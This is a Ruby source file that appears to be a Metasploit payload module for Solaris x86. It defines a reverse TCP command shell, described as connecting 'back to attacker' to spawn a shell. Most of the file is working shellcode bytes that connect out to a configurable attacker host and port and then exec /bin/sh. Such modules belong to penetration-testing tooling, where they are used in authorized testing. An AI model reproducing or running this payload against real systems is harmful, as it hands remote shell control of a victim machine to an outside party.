require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Solaris
module X86

module ShellReverseTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Solaris Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'bighawk <bighawk@warfare.com>',
			'License'       => UNKNOWN_LICENSE,
			'Platform'      => 'solaris',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 32, 'ADDR' ],
							'LPORT'    => [ 38, 'n'    ],
						},
					'Payload' =>
						"\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31" +
						"\xc9\x51\x41\x41\x51\x51\xb0\xe6\xff\xd5\x31\xd2\x89\xc7\x68\x93" +
						"\x93\x93\x93\x66\x68\x93\x93\x66\x51\x89\xe6\x6a\x10\x56\x57\xb0" +
						"\xeb\xff\xd5\x31\xd2\xb2\x09\x51\x52\x57\xb0\x3e\xff\xd5\x49\x79" +
						"\xf2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53" +
						"\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5"
				}
			))
	end

end

end end end end end
